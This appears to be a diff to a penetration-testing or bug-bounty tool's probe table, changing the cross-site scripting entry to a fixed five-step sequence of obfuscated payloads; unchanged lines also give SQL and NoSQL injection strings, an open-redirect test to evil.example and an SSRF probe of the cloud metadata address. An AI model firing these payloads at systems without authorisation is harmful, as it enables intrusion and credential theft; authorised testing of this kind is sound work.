@@ -81,7 +81,7 @@ TECH_SKILL = {
 CLASS_PROBE = {
     "sqli": "curl -s \"{u}\"   # then  ' OR '1'='1'--  and time-based  ' AND SLEEP(5)--  (Burp Intruder for blind)",
     "nosqli": "curl -s \"{u}\"   # then  [$ne]=1 / {\"$gt\":\"\"}  in the param",
-    "xss": "curl -s \"{ur}1<!--><Svg/OnLoad=(confirm)(1)-->\"   # ADDITIONAL SET FIRST (hunt-xss priority order): then 1%3C!--%3E%3CSvg%0COnLoad=(confirm)(1)--%3E and 1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(1)%3E; baseline z1z<svg/onload=alert(1)> after; javascript:/java%09script: scheme payloads LAST",
+    "xss": "curl -s \"{ur}JavaScript:confirm`K`\"   # MANDATORY FIRST TEST on every param, in this order: 1 JavaScript:confirm`K` -> 2 %27%3C%27s%27v%27g%27+o%27n%27l%27o%27a%27d%27=%27a%27l%27e%27r%27t%27(%277%27)%27+%27%3E%27 -> 3 1%3C!--%3E%3CSvg%0COnLoad=(confirm)(7110)--%3E -> 4 1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(1)%3E -> 5 1<!--><Svg/OnLoad=(confirm)(1)-->; only after all five fail test other payloads",
     "open-redirect": "curl -sI \"{ur}https://evil.example\"   # inspect the Location: response header",
     "ssrf": "curl -s \"{ur}http://169.254.169.254/latest/meta-data/\"   # Burp Collaborator for blind OOB",
     "idor": "curl -s \"{u}\"   # swap/increment the id across two identities; diff the bodies",
